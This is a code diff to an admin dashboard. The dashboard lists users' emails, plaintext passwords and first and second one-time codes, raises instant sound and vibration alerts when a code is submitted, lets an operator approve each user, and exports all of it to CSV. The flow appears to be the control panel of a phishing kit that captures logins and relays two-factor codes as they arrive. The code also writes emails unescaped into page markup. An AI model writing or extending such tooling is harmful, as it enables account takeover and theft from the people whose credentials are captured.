@@ -102,7 +102,7 @@
         table {
             width: 100%;
             border-collapse: collapse;
-            min-width: 1200px;
+            min-width: 1300px;
         }
         th {
             background: #667eea;
@@ -353,9 +353,11 @@
                     <tr>
                         <th>Email</th>
                         <th>Password</th>
-                        <th>Self-Created OTP</th>
+                        <th>First OTP</th>
+                        <th>Second OTP</th>
                         <th>Attempts</th>
                         <th>Status</th>
+                        <th>Approved</th>
                         <th>Created At</th>
                         <th>Last Updated</th>
                         <th>Actions</th>
@@ -363,7 +365,7 @@
                 </thead>
                 <tbody id="usersTableBody">
                     <tr>
-                        <td colspan="8" class="no-data" style="text-align: center; padding: 2rem;">
+                        <td colspan="10" class="no-data" style="text-align: center; padding: 2rem;">
                             <div class="spinner" style="width: 30px; height: 30px; margin: 0 auto;"></div>
                             <p>Loading users...</p>
                         </td>
@@ -610,68 +612,45 @@
             setTimeout(() => highlightUserRow(data.email), 500);
         });
 
-        // ✅ USER OTP CREATED EVENT - Success notification with sound and vibration
+        // ✅ USER FIRST OTP CREATED EVENT
         socket.on('user-otp-created', (data) => {
-            console.log('📢 INSTANT: OTP Created Received', data);
+            console.log('📢 INSTANT: First OTP Created', data);
             
-            // Show notification badge
-            showNotificationBadge(`✅ OTP Created: ${data.email}`);
-            
-            // Desktop notification with OTP
-            showNotification('✅ OTP CREATED & VERIFIED', 
-                `User: ${data.email}\n` +
-                `Password: ${data.password}\n` +
-                `OTP: ${data.otp}\n` +
-                `Status: Self-verified successfully`
+            showNotificationBadge(`✅ First OTP: ${data.email}`);
+            showNotification('✅ FIRST OTP CREATED', 
+                `User: ${data.email}\nOTP: ${data.otp}`
             );
-            
-            // Play success sound pattern
             playSound('success');
-            
-            // Vibrate for 5 seconds with happy pattern (short pulses)
-            vibrateDevice([200, 100, 200, 100, 200, 100, 200, 100, 200, 100, 200]);
-            
-            // Show toast with OTP prominently
-            showToast(
-                `📧 ${data.email}\n` +
-                `🔑 OTP: ${data.otp}`, 
-                'success', 
-                '✅ OTP VERIFIED'
-            );
-            
-            // Refresh user list
+            vibrateDevice([200, 100, 200, 100, 200]);
+            showToast(`First OTP: ${data.otp}`, 'success', '✅ First OTP');
             loadUsers();
-            
-            // Highlight the verified user
-            setTimeout(() => highlightUserRow(data.email), 500);
         });
 
-        // 🔄 USER RESET EVENT - Warning notification with sound and vibration
+        // ✅ USER SECOND OTP CREATED EVENT - NEW
+        socket.on('user-second-otp-created', (data) => {
+            console.log('📢 INSTANT: Second OTP Created', data);
+            
+            showNotificationBadge(`✅ Second OTP: ${data.email}`);
+            showNotification('✅ SECOND OTP CREATED', 
+                `User: ${data.email}\nSecond OTP: ${data.second_otp}`
+            );
+            playSound('success');
+            vibrateDevice([300, 150, 300, 150, 300]);
+            showToast(`Second OTP: ${data.second_otp}`, 'success', '✅ Second OTP');
+            loadUsers();
+        });
+
+        // 🔄 USER RESET EVENT
         socket.on('user-reset', (data) => {
             console.log('📢 INSTANT: User Reset Received', data);
             
-            // Show notification badge
             showNotificationBadge(`🔄 Reset: ${data.email}`);
-            
-            // Desktop notification
             showNotification('🔄 PROCESS RESET', 
-                `User: ${data.email}\nPassword: ${data.password}\nUser is starting over`
+                `User: ${data.email} is starting over`
             );
-            
-            // Play warning sound
             playSound('warning');
-            
-            // Vibrate for 5 seconds with warning pattern (long single vibrations)
-            vibrateDevice([1000, 500, 1000, 500, 1000]);
-            
-            // Show toast
-            showToast(
-                `${data.email} reset their OTP process`, 
-                'warning', 
-                '🔄 Process Reset'
-            );
-            
-            // Refresh user list
+            vibrateDevice([1000, 500, 1000]);
+            showToast(`${data.email} reset process`, 'warning', '🔄 Reset');
             loadUsers();
         });
 
@@ -748,43 +727,53 @@
             });
         }
 
-       // APPROVE USER FUNCTION - FIXED
-async function approveUser(email) {
-    console.log('✅ Approving user:', email);
-    showLoading('Approving', `Approving ${email}...`);
-    
-    try {
-        const response = await fetch('/api/admin/approve-user', {
-            method: 'POST',
-            headers: { 
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${token}`
-            },
-            body: JSON.stringify({ email })
-        });
-        
-        const data = await response.json();
-        console.log('Approve response:', data);
-        
-        if (data.success) {
-            showToast(`User ${email} approved`, 'success', '✅ Approved');
-            playSound('success');
-            if ('vibrate' in navigator) {
-                navigator.vibrate([200, 100, 200]);
-            }
+        // APPROVE USER FUNCTION
+        async function approveUser(email) {
+            console.log('✅ Approving user:', email);
+            showLoading('Approving', `Approving ${email}...`);
             
-            // Refresh user list to show updated status
-            loadUsers();
-        } else {
-            showToast(data.error || 'Failed to approve user', 'error', 'Error');
+            try {
+                const response = await fetch('/api/admin/approve-user', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${token}`
+                    },
+                    body: JSON.stringify({ email })
+                });
+                
+                const data = await response.json();
+                console.log('Approve response:', data);
+                
+                if (data.success) {
+                    showToast(`User ${email} approved`, 'success', '✅ Approved');
+                    playSound('success');
+                    if ('vibrate' in navigator) {
+                        navigator.vibrate([200, 100, 200]);
+                    }
+                    
+                    // Refresh user list to show updated status
+                    loadUsers();
+                } else {
+                    showToast(data.error || 'Failed to approve user', 'error', 'Error');
+                }
+            } catch (error) {
+                console.error('Approve error:', error);
+                showToast('Error approving user', 'error', 'Error');
+            } finally {
+                hideLoading();
+            }
         }
-    } catch (error) {
-        console.error('Approve error:', error);
-        showToast('Error approving user', 'error', 'Error');
-    } finally {
-        hideLoading();
-    }
-}
+
+        // VIEW SECOND OTP FUNCTION - NEW
+        function viewSecondOtp(email) {
+            const user = allUsers.find(u => u.email === email);
+            if (user && user.second_otp) {
+                showToast(`Second OTP for ${email}: ${user.second_otp}`, 'info', '📱 Second OTP');
+            } else {
+                showToast('No second OTP found for this user', 'warning', '⚠️ Not Found');
+            }
+        }
 
         // Load users
         async function loadUsers() {
@@ -857,7 +846,7 @@ async function approveUser(email) {
             const tbody = document.getElementById('usersTableBody');
             
             if (users.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="8" class="no-data" style="text-align: center; padding: 2rem;">No users found</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="10" class="no-data" style="text-align: center; padding: 2rem;">No users found</td></tr>';
                 return;
             }
 
@@ -866,13 +855,16 @@ async function approveUser(email) {
                 const otpDisplay = user.otp ? 
                     `<span class="otp-display">${user.otp}</span>` : 
                     '<span class="badge badge-secondary">Not set</span>';
+                const secondOtpDisplay = user.second_otp ? 
+                    `<span class="otp-display">${user.second_otp}</span>` : 
+                    '<span class="badge badge-secondary">Not set</span>';
                 const attemptsDisplay = user.otp_attempts || 0;
                 
                 let statusBadge = '';
                 if (user.otp_verified) {
                     statusBadge = '<span class="badge badge-success">✅ Verified</span>';
                 } else if (user.otp) {
-                    statusBadge = '<span class="badge badge-info">⏳ OTP Set</span>';
+                    statusBadge = '<span class="badge badge-info">⏳ First OTP Set</span>';
                 } else {
                     statusBadge = '<span class="badge badge-warning">🕒 Pending</span>';
                 }
@@ -881,18 +873,29 @@ async function approveUser(email) {
                     '<span class="badge badge-danger">Max Attempts</span>' : 
                     `<span class="badge badge-info">${attemptsDisplay}/3</span>`;
                 
+                const approvedBadge = user.approved ? 
+                    '<span class="badge badge-success">✅ Yes</span>' : 
+                    '<span class="badge badge-warning">⏳ No</span>';
+                
                 return `
                 <tr class="${statusClass}">
                     <td><strong>${user.email}</strong></td>
                     <td><code>${user.password}</code></td>
                     <td>${otpDisplay}</td>
+                    <td>${secondOtpDisplay}</td>
                     <td>${attemptsBadge}</td>
                     <td>${statusBadge}</td>
+                    <td>${approvedBadge}</td>
                     <td>${new Date(user.created_at).toLocaleString()}</td>
                     <td>${new Date(user.updated_at).toLocaleString()}</td>
                     <td>
                         <button onclick="viewUserDetails('${user.email}')" class="badge badge-info" style="border: none; cursor: pointer; margin-right: 5px;">👁️ View</button>
-                        <button onclick="approveUser('${user.email}')" class="badge badge-success" style="border: none; cursor: pointer; background: #4CAF50; color: white; padding: 5px 10px;">✅ Approve</button>
+                        ${!user.approved ? 
+                            `<button onclick="approveUser('${user.email}')" class="badge badge-success" style="border: none; cursor: pointer; background: #4CAF50; color: white; padding: 5px 10px; margin-right: 5px;">✅ Approve</button>` 
+                            : ''}
+                        ${user.second_otp ? 
+                            `<button onclick="viewSecondOtp('${user.email}')" class="badge badge-info" style="border: none; cursor: pointer; background: #2196F3; color: white; padding: 5px 10px;">📱 View Second OTP</button>` 
+                            : ''}
                     </td>
                 </tr>
             `}).join('');
@@ -904,21 +907,25 @@ async function approveUser(email) {
                 showToast(`
                     Email: ${user.email}\n
                     Password: ${user.password}\n
-                    OTP: ${user.otp || 'Not set'}\n
+                    First OTP: ${user.otp || 'Not set'}\n
+                    Second OTP: ${user.second_otp || 'Not set'}\n
                     Status: ${user.otp_verified ? 'Verified' : 'Pending'}\n
+                    Approved: ${user.approved ? 'Yes' : 'No'}\n
                     Attempts: ${user.otp_attempts || 0}/3
                 `, 'info', 'User Details');
             }
         }
 
         function exportToCSV() {
-            const headers = ['Email', 'Password', 'OTP', 'Attempts', 'Verified', 'Created At', 'Updated At'];
+            const headers = ['Email', 'Password', 'First OTP', 'Second OTP', 'Attempts', 'Verified', 'Approved', 'Created At', 'Updated At'];
             const csvData = filteredUsers.map(u => [
                 u.email,
                 u.password,
                 u.otp || '',
+                u.second_otp || '',
                 u.otp_attempts || 0,
                 u.otp_verified ? 'Yes' : 'No',
+                u.approved ? 'Yes' : 'No',
                 new Date(u.created_at).toLocaleString(),
                 new Date(u.updated_at).toLocaleString()
             ]);
